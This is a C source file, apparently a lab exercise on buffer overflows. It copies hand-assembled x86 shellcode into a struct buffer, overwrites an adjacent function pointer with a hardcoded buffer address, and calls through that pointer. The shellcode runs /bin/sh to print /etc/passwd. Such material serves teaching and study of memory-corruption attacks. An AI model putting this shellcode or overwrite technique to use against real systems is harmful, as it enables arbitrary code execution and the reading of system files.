#include <stdio.h>

//+ Define a buffer of size 100 followed by a function pointer. Create an instance of this struct called y. //-
struct {
    char buffer[100];
    void (*x)();
} y;
//+ Forward declaration of the foo() function. //-
void foo();

//+ 
// Purpose: Main function of selfcomp.
// Parameters: None.
// Function: This function was first used to determine the length of a buffer using a string of 'X' characters. It also copies the hex code from exploit.lst into an array called exploit2 that is later used to exploit the system.  
//-
int main(){

    // 100 'X' characters were required to terminate the execution with a segmentation fault.
    char *exploit =
	"XXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXX"
	 "WXYZ";

    // The size of the exploit array is 105 = 100 (number of 'X' chars) + 4 chars (WXYZ) + 1 (null character to         terminate the string).
    char exploit2[105] = {
    // exploit code goes here
     0x90,
     0x90,
     0x90,
     0xEB,
     0x29,
     0x5E,
     0x31,
     0xC0,
     0x88, // mov flagStr
     0x46,
     0x07, 
     0x88, //mov comdStr
     0x46,
     0x0B,
     0x88, // mov arrayAddr
     0x46,
     0x20,
     0x89, // mov arrayAddr
     0x46,
     0x2D,
     0x89, // mov arrayAddr
     0x76,
     0x21,
     0x8D,
     0x7E,
     0x09,
     0x89,
     0x7E,
     0x25,
     0x8D,
     0x7E,
     0x0C,
     0x89,
     0x7E,
     0x29,
     0xB0,
     0x0B,
     0x89,
     0xF3,
     0x8D,
     0x4E,
     0x21,
     0x31,
     0xD2,
     0xCD,
     0x80,
     0xE8,
     0xD2,
     0xFF,
     0xFF,
     0xFF,
     0x2F,
     0x62,
     0x69,
     0x6E,
     0x2F,
     0x73,
     0x68,
     0x58,
     0x79,
     0x2D,
     0x63,
     0x58,  
     0x63,
     0x61,
     0x74,
     0x20,
     0x2F,
     0x65,
     0x74,
     0x63,
     0x2F,
     0x70,
     0x61,
     0x73,
     0x73,
     0x77,
     0x64,
     0x3B,
     0x65,
     0x78,
     0x69,
     0x74,
     0x58,            
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
     0xFF,
    // buffer address goes here
    0x40,
    0x97,
    0x04,
    0x08,
    // NULL terminator
    0x00
    };

    int i;

    // Set the function pointer to the foo() function.
    y.x = foo;
    // Copy the exploit code into the buffer.
    for (i = 0; exploit2[i]; i++){
	y.buffer[i] = exploit2[i];
    }
    // Call the foo() function by dereferencing the function pointer.
    (*y.x)();
}

//+ 
// Purpose: Print the contents of the buffer to the console.
// Parameters: None.
// Function: This function uses the printf() function to display the contents of the buffer.  
//-
void foo(){
   printf("%s %x\n", y.buffer, &y.x);
}
